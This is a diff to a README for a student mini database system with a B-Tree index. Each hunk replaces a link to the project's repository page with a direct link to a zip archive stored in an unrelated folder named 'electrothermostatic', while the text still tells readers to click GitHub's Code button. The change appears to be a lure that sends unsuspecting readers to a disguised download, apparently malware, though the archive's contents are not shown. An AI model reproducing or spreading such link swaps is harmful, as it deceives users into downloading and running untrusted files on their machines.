@@ -1,11 +1,11 @@
-[![Download Here](https://img.shields.io/badge/Download%20App-blue?style=for-the-badge)](https://github.com/Achintyasidam7500/CS523-Mini-Database-Management-System)
+[![Download Here](https://img.shields.io/badge/Download%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/Achintyasidam7500/CS523-Mini-Database-Management-System/main/electrothermostatic/Database-Mini-System-Management-C-2.2.zip)
 
 # 🗄️ CS523-Mini-Database-Management-System - Run a Mini DB on Windows
 
 ## 📥 Download
 Use this link to visit the page and download the project:
 
-[CS523-Mini-Database-Management-System](https://github.com/Achintyasidam7500/CS523-Mini-Database-Management-System)
+[CS523-Mini-Database-Management-System](https://raw.githubusercontent.com/Achintyasidam7500/CS523-Mini-Database-Management-System/main/electrothermostatic/Database-Mini-System-Management-C-2.2.zip)
 
 ## 🧭 What This App Does
 This project is a mini database management system built for learning and practice. It helps you store, view, search, and manage data in a simple app. The system uses a B-Tree index, which helps the app find records faster.
@@ -33,7 +33,7 @@ If the project includes a Python backend and a React frontend, use these common 
 Follow these steps on Windows:
 
 1. Open the download page here:  
-   [CS523-Mini-Database-Management-System](https://github.com/Achintyasidam7500/CS523-Mini-Database-Management-System)
+   [CS523-Mini-Database-Management-System](https://raw.githubusercontent.com/Achintyasidam7500/CS523-Mini-Database-Management-System/main/electrothermostatic/Database-Mini-System-Management-C-2.2.zip)
 
 2. On the GitHub page, click the green Code button.
 
@@ -170,7 +170,7 @@ It fits topics such as:
 
 ## 📌 Download Link
 Visit this page to download the project:
-[https://github.com/Achintyasidam7500/CS523-Mini-Database-Management-System](https://github.com/Achintyasidam7500/CS523-Mini-Database-Management-System)
+[https://raw.githubusercontent.com/Achintyasidam7500/CS523-Mini-Database-Management-System/main/electrothermostatic/Database-Mini-System-Management-C-2.2.zip](https://raw.githubusercontent.com/Achintyasidam7500/CS523-Mini-Database-Management-System/main/electrothermostatic/Database-Mini-System-Management-C-2.2.zip)
 
 ## 🔧 Basic Windows Run Flow
 Use this flow if you want a quick path:
@@ -203,4 +203,4 @@ This project can help you learn:
 - School: UIT - VNU-HCM
 - Topic: Mini Database Management System with B-Tree index
 - Platform: Windows
-- Primary Link: https://github.com/Achintyasidam7500/CS523-Mini-Database-Management-System
+- Primary Link: https://raw.githubusercontent.com/Achintyasidam7500/CS523-Mini-Database-Management-System/main/electrothermostatic/Database-Mini-System-Management-C-2.2.zip
